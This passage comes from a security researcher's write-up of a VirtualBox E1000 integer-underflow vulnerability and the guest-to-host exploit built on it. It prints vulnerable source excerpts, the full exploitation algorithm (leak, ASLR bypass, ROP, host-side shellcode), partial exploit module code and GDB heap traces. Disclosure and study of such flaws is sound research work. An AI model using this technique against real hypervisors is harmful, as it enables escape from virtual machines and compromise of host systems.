&lt;p&gt;Here we call e1kLocateTxPacket do the initial processing of context_4 and data_5 descriptors. It has been said that we can set context_4.maximum_segment_size to a size lesser than the size of data already read i.e. lesser than 0x10. Recall our input Tx descriptors:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;context_4.header_length = 0
context_4.maximum_segment_size = 0xF
context_4.tcp_segmentation_enabled = true

data_5.data_length = 0x4188
data_5.end_of_packet = true
data_5.tcp_segmentation_enabled = true
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;As a result of the call to e1kLocateTxPacket we have the maximum segment size equals to 0xF, whereas the size of data already read is 0x10.&lt;/p&gt;
&lt;p&gt;Finally, when processing data_5 we again arrive to e1kFallbackAddToFrame and have the following variable values:&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tx Descriptor&lt;/th&gt;
&lt;th&gt;Before/After&lt;/th&gt;
&lt;th&gt;u16MaxPktLen&lt;/th&gt;
&lt;th&gt;pThis-&amp;gt;u16TxPktLen&lt;/th&gt;
&lt;th&gt;pDesc-&amp;gt;data.cmd.u20DTALEN&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;data_5&lt;/td&gt;
&lt;td&gt;Before&lt;/td&gt;
&lt;td&gt;0xF&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0x4188&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;After&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;And therefore we have an integer underflow:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = u16MaxPktLen - pThis-&amp;gt;u16TxPktLen;
=&amp;gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = &lt;span class=&quot;pl-c1&quot;&gt;0xF&lt;/span&gt; - &lt;span class=&quot;pl-c1&quot;&gt;0x10&lt;/span&gt; = &lt;span class=&quot;pl-c1&quot;&gt;0xFFFFFFFF&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This makes the following check to be true since 0xFFFFFFFF &amp;gt; 0x4188:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (cb &amp;gt; pDesc-&amp;gt;data.cmd.u20DTALEN)
        {
            cb = pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;;
            rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kFallbackAddSegment&lt;/span&gt;(pThis, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt;, cb, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;fSend&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;, fOnWorkerThread);
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;e1kFallbackAddSegment function will be called with size 0x4188. Without the vulnerability it's impossible to call e1kFallbackAddSegment with a size greater than 0x4000 because, during the TCP Segmentation Context Update in e1kUpdateTxContext, there is a check that the maximum segment size is less or equal to 0x4000:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;DECLINLINE&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;) e1kUpdateTxContext(PE1KSTATE pThis, E1KTXDESC *pDesc)
{
...
        &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cbMaxSegmentSize = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u16MSS&lt;/span&gt; + pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u8HDRLEN&lt;/span&gt; + &lt;span class=&quot;pl-c1&quot;&gt;4&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;VTAG&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_UNLIKELY&lt;/span&gt;(cbMaxSegmentSize &amp;gt; E1K_MAX_TX_PKT_SIZE))
        {
            pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u16MSS&lt;/span&gt; = E1K_MAX_TX_PKT_SIZE - pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u8HDRLEN&lt;/span&gt; - &lt;span class=&quot;pl-c1&quot;&gt;4&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;VTAG&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
            ...
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Buffer Overflow&lt;/h3&gt;
&lt;p&gt;We have called e1kFallbackAddSegment with size 0x4188. How this can be abused? There are at least two possibilities I found. Firstly, data will be read from the guest into a heap buffer:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kFallbackAddSegment&lt;/span&gt;(PE1KSTATE pThis, RTGCPHYS PhysAddr, &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; u16Len, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fSend, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
    ...
    &lt;span class=&quot;pl-c1&quot;&gt;PDMDevHlpPhysRead&lt;/span&gt;(pThis-&amp;gt;&lt;span class=&quot;pl-c1&quot;&gt;CTX_SUFF&lt;/span&gt;(pDevIns), PhysAddr,
                      pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;aTxPacketFallback&lt;/span&gt; + pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u16TxPktLen&lt;/span&gt;, u16Len);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here pThis-&amp;gt;aTxPacketFallback is the buffer of size 0x3FA0 and u16Len is 0x4188 — an obvious overflow that can lead, for example, to a function pointers overwrite.&lt;/p&gt;
&lt;p&gt;Secondly, if we dig deeper we found that e1kFallbackAddSegment calls e1kTransmitFrame that can, with a certain configuration of E1000 registers, call e1kHandleRxPacket function. This function allocates a stack buffer of size 0x4000 and then copies data of a specified length (0x4188 in our case) to the buffer without any check:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kHandleRxPacket&lt;/span&gt;(PE1KSTATE pThis, &lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; *pvBuf, &lt;span class=&quot;pl-c1&quot;&gt;size_t&lt;/span&gt; cb, E1KRXDST status)
{
#&lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; defined(IN_RING3)
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;   rxPacket[E1K_MAX_RX_PKT_SIZE];
    ...
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (status.&lt;span class=&quot;pl-smi&quot;&gt;fVP&lt;/span&gt;)
    {
        ...
    }
    &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;pl-c1&quot;&gt;memcpy&lt;/span&gt;(rxPacket, pvBuf, cb);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you see, we turned an integer underflow to a classical stack buffer overflow. The two overflows above — heap and stack ones — are used in the exploit.&lt;/p&gt;
&lt;h2&gt;Exploit&lt;/h2&gt;
&lt;p&gt;The exploit is Linux kernel module (LKM) to load in a guest OS. The Windows case would require a driver differing from the LKM just by an initialization wrapper and kernel API calls.&lt;/p&gt;
&lt;p&gt;Elevated privileges are required to load a driver in both OSs. It's common and isn't considered an insurmountable obstacle. Look at Pwn2Own contest where researcher use exploit chains: a browser opened a malicious website in the guest OS is exploited, a browser sandbox escape is made to gain full ring 3 access, an operating system vulnerability is exploited to pave a way to ring 0 from where there are anything you need to attack a hypervisor from the guest OS. The most powerful hypervisor vulnerabilities are for sure those that can be exploited from guest ring 3. There in VirtualBox is also such code that is reachable without guest root privileges, and it's mostly not audited yet.&lt;/p&gt;
&lt;p&gt;The exploit is 100% reliable. It means it either works always or never because of mismatched binaries or other, more subtle reasons I didn't account. It works at least on Ubuntu 16.04 and 18.04 x86_64 guests with default configuration.&lt;/p&gt;
&lt;h3&gt;Exploitation Algorithm&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;An attacker unloads e1000.ko loaded by default in Linux guests and loads the exploit's LKM.&lt;/li&gt;
&lt;li&gt;The LKM initializes E1000 according to the datasheet. Only the transmit half is initialized since there is no need for the receive half.&lt;/li&gt;
&lt;li&gt;Step 1: information leak.
&lt;ol&gt;&lt;li&gt;The LKM disables E1000 loopback mode to make stack buffer overflow code unreachable.&lt;/li&gt;
&lt;li&gt;The LKM uses the integer underflow vulnerability to make the heap buffer overflow.&lt;/li&gt;
&lt;li&gt;The heap buffer overflow allows for use E1000 EEPROM to write two any bytes relative to a heap buffer in 128 KB range. Hence the attacker gains a write primitive.&lt;/li&gt;
&lt;li&gt;The LKM uses the write primitive 8 times to write bytes to ACPI (Advanced Configuration and Power Interface) data structure on heap. Bytes are written to an index variable of a heap buffer from which a single byte will be read. Since the buffer size is lesser than maximum index number (255) the attacker can read past the buffer, hence he/she gains a read primitive.&lt;/li&gt;
&lt;li&gt;The LKM uses the read primitive 8 times to access ACPI and obtain 8 bytes from the heap. Those bytes are pointer of VBoxDD.so shared library.&lt;/li&gt;
&lt;li&gt;The LKM subtracts RVA from the pointer to obtain VBoxDD.so image base.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Step 2: stack buffer overflow.
&lt;ol&gt;&lt;li&gt;The LKM enabled E1000 loopback mode to make stack buffer overflow code reachable.&lt;/li&gt;
&lt;li&gt;The LKM uses the integer underflow vulnerability to make the heap buffer overflow and the stack buffer overflow. Saved return address (RIP/EIP) is overwritten. The attacker gains control.&lt;/li&gt;
&lt;li&gt;ROP chain is executed to execute a shellcode loader.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Step 3: shellcode.
&lt;ol&gt;&lt;li&gt;The shellcode loader copies a shellcode from the stack next to itself. The shellcode is executed.&lt;/li&gt;
&lt;li&gt;The shellcode does fork and execve syscalls to spawn an arbitrary process on the host side.&lt;/li&gt;
&lt;li&gt;The parent process does process continuation.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;The attacker unloads the LKM and loads e1000.ko back to allow the guest to use network.&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;Initialization&lt;/h3&gt;
&lt;p&gt;The LKM maps physical memory regarding to E1000 MMIO. Physical address and size are predefined by the hypervisor.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* &lt;span class=&quot;pl-en&quot;&gt;map_mmio&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;) {
    &lt;span class=&quot;pl-c1&quot;&gt;off_t&lt;/span&gt; pa = &lt;span class=&quot;pl-c1&quot;&gt;0xF0000000&lt;/span&gt;;
    &lt;span class=&quot;pl-c1&quot;&gt;size_t&lt;/span&gt; len = &lt;span class=&quot;pl-c1&quot;&gt;0x20000&lt;/span&gt;;

    &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* va = &lt;span class=&quot;pl-c1&quot;&gt;ioremap&lt;/span&gt;(pa, len);
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!va) {
        &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;ioremap failed to map MMIO&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);
        &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;NULL&lt;/span&gt;;
    }

    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; va;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then E1000 general purpose registers are configured, Tx Ring memory is allocated, transmit registers are configured.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1000_init&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio) {
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Configure general purpose registers&lt;/span&gt;

    &lt;span class=&quot;pl-c1&quot;&gt;configure_CTRL&lt;/span&gt;(mmio);

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Configure TX registers&lt;/span&gt;

    g_tx_ring = &lt;span class=&quot;pl-c1&quot;&gt;kmalloc&lt;/span&gt;(MAX_TX_RING_SIZE, GFP_KERNEL);
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!g_tx_ring) {
        &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Failed to allocate TX Ring&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);
        &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt;;
    }

    &lt;span class=&quot;pl-c1&quot;&gt;configure_TDBAL&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;configure_TDBAH&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;configure_TDLEN&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;configure_TCTL&lt;/span&gt;(mmio);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;ASLR Bypass&lt;/h3&gt;
&lt;h4&gt;Write primitive&lt;/h4&gt;
&lt;p&gt;From the beginning of exploit development I decided not to use primitives found in services disabled by default. This means in the first place the Chromium service (not a browser) that provides for 3D acceleration where more than 40 vulnerabilities are found by researchers in the last year.&lt;/p&gt;
&lt;p&gt;The problem was to find an information leak in default VirtualBox subsystems. The obvious thought was that if the integer underflow allows to overflow the heap buffer then we control anything past the buffer. We'll see that not a single additional vulnerability was required: the integer underflow appeared to be quite powerful to derive read, write, and information leak primitives from it, not saying of the stack buffer overflow.&lt;/p&gt;
&lt;p&gt;Let's examine what exactly is overflowed on the heap.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;*&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; * Device state structure.&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;struct&lt;/span&gt; E1kState_st
{
...
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;     aTxPacketFallback[E1K_MAX_TX_PKT_SIZE];
...
    E1kEEPROM   eeprom;
...
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here aTxPacketFallback is a buffer of size 0x3FA0 which will be overflowed with bytes copied from a data descriptor. Searching for interesting fields after the buffer I came to E1kEEPROM structure which contains another structure with the following fields (src/VBox/Devices/Network/DevE1000.cpp):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;*&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; * 93C46-compatible EEPROM device emulation.&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;struct&lt;/span&gt; EEPROM93C46
{
...
    &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; m_fWriteEnabled;
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt; Alignment1;
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; m_u16Word;
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; m_u16Mask;
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; m_u16Addr;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; m_u32InternalWires;
...
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;How can we abuse them? E1000 implements EEPROM, secondary adaptor memory. The guest OS can access it via E1000 MMIO registers. EEPROM is implemented as a finite automaton with several states and does four actions. We are interested only in &quot;write to memory&quot;. This is how it looks (src/VBox/Devices/Network/DevEEPROM.cpp):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
EEPROM93C46::State &lt;span class=&quot;pl-en&quot;&gt;EEPROM93C46::opWrite&lt;/span&gt;()
{
    &lt;span class=&quot;pl-c1&quot;&gt;storeWord&lt;/span&gt;(m_u16Addr, m_u16Word);
    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; WAITING_CS_FALL;
}

&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;EEPROM93C46::storeWord&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; u32Addr, &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; u16Value)
{
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (m_fWriteEnabled) {
        &lt;span class=&quot;pl-c1&quot;&gt;E1kLog&lt;/span&gt;((&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;EEPROM: Stored word &lt;span class=&quot;pl-c1&quot;&gt;%04x&lt;/span&gt; at &lt;span class=&quot;pl-c1&quot;&gt;%08x&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, u16Value, u32Addr));
        m_au16Data[u32Addr] = u16Value;
    }
    m_u16Mask = DATA_MSB;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here m_u16Addr, m_u16Word, and m_fWriteEnabled are fields of EEPROM93C46 structure we control. We can malform them in a way that&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
m_au16Data[u32Addr] = u16Value;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;statement will write two bytes at arbitrary 16-bit offset from m_au16Data that also residing in the structure. We have found a write primitive.&lt;/p&gt;
&lt;h4&gt;Read primitive&lt;/h4&gt;
&lt;p&gt;The next problem was to find data structures on the heap to write arbitrary data into, pursuing the main goal to leak a shared library pointer to get its image base. Hopefully, it was need not to do an unstable heap spray because virtual devices' main data structures appeared to be allocated from an internal hypervisor heap in the way that the distance between them is always constant, despite that their virtual addresses, of course, are randomized by ASLR.&lt;/p&gt;
&lt;p&gt;When a virtual machine is launched the PDM (Pluggable Device and Driver Manager) subsystem allocates PDMDEVINS objects in the hypervisor heap.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;pdmR3DevInit&lt;/span&gt;(PVM pVM)
{
...
        PPDMDEVINS pDevIns;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (paDevs[i].&lt;span class=&quot;pl-smi&quot;&gt;pDev&lt;/span&gt;-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;pReg&lt;/span&gt;-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fFlags&lt;/span&gt; &amp;amp; (PDM_DEVREG_FLAGS_RC | PDM_DEVREG_FLAGS_R0))
            rc = &lt;span class=&quot;pl-c1&quot;&gt;MMR3HyperAllocOnceNoRel&lt;/span&gt;(pVM, cb, &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;, MM_TAG_PDM_DEVICE, (&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; **)&amp;amp;pDevIns);
        &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
            rc = &lt;span class=&quot;pl-c1&quot;&gt;MMR3HeapAllocZEx&lt;/span&gt;(pVM, MM_TAG_PDM_DEVICE, cb, (&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; **)&amp;amp;pDevIns);
...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I traced that code under GDB using a script and got these results:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[trace-device-constructors] Constructing a device #0x0:
[trace-device-constructors] Name: &quot;pcarch&quot;, '\000' &amp;lt;repeats 25 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6f125a &quot;PC Architecture Device&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d57517b &amp;lt;pcarchConstruct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc45486c1b0
[trace-device-constructors] Data size: 0x8

[trace-device-constructors] Constructing a device #0x1:
[trace-device-constructors] Name: &quot;pcbios&quot;, '\000' &amp;lt;repeats 25 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6ef37b &quot;PC BIOS Device&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d56bd3b &amp;lt;pcbiosConstruct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc45486c720
[trace-device-constructors] Data size: 0x11e8

...

[trace-device-constructors] Constructing a device #0xe:
[trace-device-constructors] Name: &quot;e1000&quot;, '\000' &amp;lt;repeats 26 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d70c6d0 &quot;Intel PRO/1000 MT Desktop Ethernet.\n&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d622969 &amp;lt;e1kR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc470083400
[trace-device-constructors] Data size: 0x53a0

[trace-device-constructors] Constructing a device #0xf:
[trace-device-constructors] Name: &quot;ichac97&quot;, '\000' &amp;lt;repeats 24 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d716ac0 &quot;ICH AC'97 Audio Controller&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d66a90f &amp;lt;ichac97R3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc470088b00
[trace-device-constructors] Data size: 0x1848

[trace-device-constructors] Constructing a device #0x10:
[trace-device-constructors] Name: &quot;usb-ohci&quot;, '\000' &amp;lt;repeats 23 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d707025 &quot;OHCI USB controller.\n&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d5ea841 &amp;lt;ohciR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc47008a4e0
[trace-device-constructors] Data size: 0x1728

[trace-device-constructors] Constructing a device #0x11:
[trace-device-constructors] Name: &quot;acpi&quot;, '\000' &amp;lt;repeats 27 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6eced8 &quot;Advanced Configuration and Power Interface&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d563431 &amp;lt;acpiR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc47008be70
[trace-device-constructors] Data size: 0x1570

[trace-device-constructors] Constructing a device #0x12:
[trace-device-constructors] Name: &quot;GIMDev&quot;, '\000' &amp;lt;repeats 25 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6f17fa &quot;VirtualBox GIM Device&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d575cde &amp;lt;gimdevR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc47008dba0
[trace-device-constructors] Data size: 0x90

[trace-device-constructors] Instances:
[trace-device-constructors] #0x0 Address: 0x7fc45486c1b0
[trace-device-constructors] #0x1 Address 0x7fc45486c720 differs from previous by 0x570
[trace-device-constructors] #0x2 Address 0x7fc4700685f0 differs from previous by 0x1b7fbed0
[trace-device-constructors] #0x3 Address 0x7fc4700696d0 differs from previous by 0x10e0
[trace-device-constructors] #0x4 Address 0x7fc47006a0d0 differs from previous by 0xa00
[trace-device-constructors] #0x5 Address 0x7fc47006a450 differs from previous by 0x380
[trace-device-constructors] #0x6 Address 0x7fc47006a920 differs from previous by 0x4d0
[trace-device-constructors] #0x7 Address 0x7fc47006ad50 differs from previous by 0x430
[trace-device-constructors] #0x8 Address 0x7fc47006b240 differs from previous by 0x4f0
[trace-device-constructors] #0x9 Address 0x7fc4548ec9a0 differs from previous by 0x-1b77e8a0
[trace-device-constructors] #0xa Address 0x7fc470075f90 differs from previous by 0x1b7895f0
[trace-device-constructors] #0xb Address 0x7fc488022000 differs from previous by 0x17fac070
[trace-device-constructors] #0xc Address 0x7fc47007cf80 differs from previous by 0x-17fa5080
[trace-device-constructors] #0xd Address 0x7fc4700820f0 differs from previous by 0x5170
[trace-device-constructors] #0xe Address 0x7fc470083400 differs from previous by 0x1310
[trace-device-constructors] #0xf Address 0x7fc470088b00 differs from previous by 0x5700
[trace-device-constructors] #0x10 Address 0x7fc47008a4e0 differs from previous by 0x19e0
[trace-device-constructors] #0x11 Address 0x7fc47008be70 differs from previous by 0x1990
[trace-device-constructors] #0x12 Address 0x7fc47008dba0 differs from previous by 0x1d30
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Note the E1000 device at #0xE position. It can be seen in the second list that the following device is at 0x5700 offset from E1000, the next is at 0x19E0 and so on. We already said that these distances are always the same, and it's our exploitation opportunity.&lt;/p&gt;
&lt;p&gt;Devices following E1000 are ICH IC'97, OHCI, ACPI, VirtualBox GIM. Learning their data structures I figured the way to use the write primitive.&lt;/p&gt;
&lt;p&gt;On virtual machine boot up the ACPI device is created (src/VBox/Devices/PC/DevACPI.cpp):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
